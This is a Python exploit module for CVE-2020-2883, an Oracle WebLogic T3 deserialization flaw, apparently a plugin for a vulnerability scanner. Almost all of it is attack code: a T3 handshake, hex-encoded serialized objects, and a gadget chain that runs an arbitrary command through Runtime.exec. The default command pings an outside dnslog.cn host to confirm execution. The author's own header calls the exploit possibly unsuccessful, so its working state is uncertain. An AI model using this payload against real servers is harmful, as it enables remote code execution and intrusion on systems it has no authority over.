#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
# CVE-2020-2883
# updated 2020/06/09
# by zhzyker（exploit unsuccessful, maybe wrong）

import re
import socket
import time
from multiprocessing.managers import SyncManager
from typing import Any, Dict, List, Mapping, Tuple, Union

from stars import target_type, Star


# @universe.groups()
class CVE_2020_2883(Star):
    info = {
        'NAME': '',
        'CVE': 'CVE-2020-2883',
        'TAG': []
    }
    type = target_type.VULNERABILITY

    def light_up(self, dip, dport, force_ssl=None, delay=2, timeout=5, cmd='ping 5nf3bz.dnslog.cn', *args,
                 **kwargs) -> (bool, dict):
        # 对端响应数据需要一段时间，使用 delay 来控制，如果不成功，可以加到 3s 左右，超过这个基本都是打了补丁的
        # t3 handshake
        dport = int(dport)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        try:
            sock.connect((dip, dport))
        except socket.timeout:
            return False, {'msg': 'connection timeout.'}
        except ConnectionRefusedError:
            return False, {'msg': 'connection refuse.'}
        sock.send(bytes.fromhex(
            '74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'))
        time.sleep(delay)
        sock.recv(1024)

        # build t3 request object
        data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'
        data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format(
            '{:04x}'.format(dport))
        data3 = '1a7727000d3234322e323134'
        data4 = '2e312e32353461863d1d0000000078'
        for d in [data1, data2, data3, data4]:
            sock.send(bytes.fromhex(d))

        # send evil object data
        payload = '056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'
        # -------- attack code start --------
        payload += 'aced0005737200176a6176612e7574696c2e5072696f72697479517565756594da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b78700000000273720030636f6d2e74616e676f736f6c2e7574696c2e636f6d70617261746f722e457874726163746f72436f6d70617261746f72c7ad6d3a676f3c180200014c000b6d5f657874726163746f727400224c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b78707372002c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e436861696e6564457874726163746f72889f81b0945d5b7f02000078720036636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374436f6d706f73697465457874726163746f72086b3d8c05690f440200015b000c6d5f61457874726163746f727400235b4c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b7872002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374457874726163746f72658195303e7238210200014900096d5f6e546172676574787000000000757200235b4c636f6d2e74616e676f736f6c2e7574696c2e56616c7565457874726163746f723b2246204735c4a0fe0200007870000000037372002f636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f72ee7ae995c02fb4a20200025b00096d5f616f506172616d7400135b4c6a6176612f6c616e672f4f626a6563743b4c00096d5f734d6574686f647400124c6a6176612f6c616e672f537472696e673b7871007e000900000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647371007e000d000000007571007e001100000002707571007e001100000000740006696e766f6b657371007e000d000000007571007e00110000000174'
        payload += '{:04x}'.format(len(cmd))
        payload += cmd.encode().hex()
        payload += '74000465786563770400000003767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707400013178'
        # --------- attack code end ---------
        payload += 'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'
        payload = '%s%s' % ('{:08x}'.format(len(payload) // 2 + 4), payload)
        sock.send(bytes.fromhex(payload))
        time.sleep(delay)
        sock.send(bytes.fromhex(payload))
        # raise NotImplementedError('undefine.')
        try:
            res = sock.recv(4096)
            # r = re.search(b'\\$Proxy[0-9]+', res)
            return b'weblogic' in res, {'msg': 'finish.'}
        except socket.timeout:
            return False, {'msg': 'connection timeout.'}


def run(queue: SyncManager.Queue, data: Dict):
    obj = CVE_2020_2883()
    result = {
        'IP': data['IP'],
        'PORT': data['PORT'],
        'NAME': obj.info['CVE'] if obj.info['CVE'] else obj.info['NAME'],
        'MSG': '',
        'STATE': False
    }
    result['STATE'], result['MSG'] = obj.light_and_msg(
        data['IP'], data['PORT'], data['IS_SSL'])

    queue.put(result)
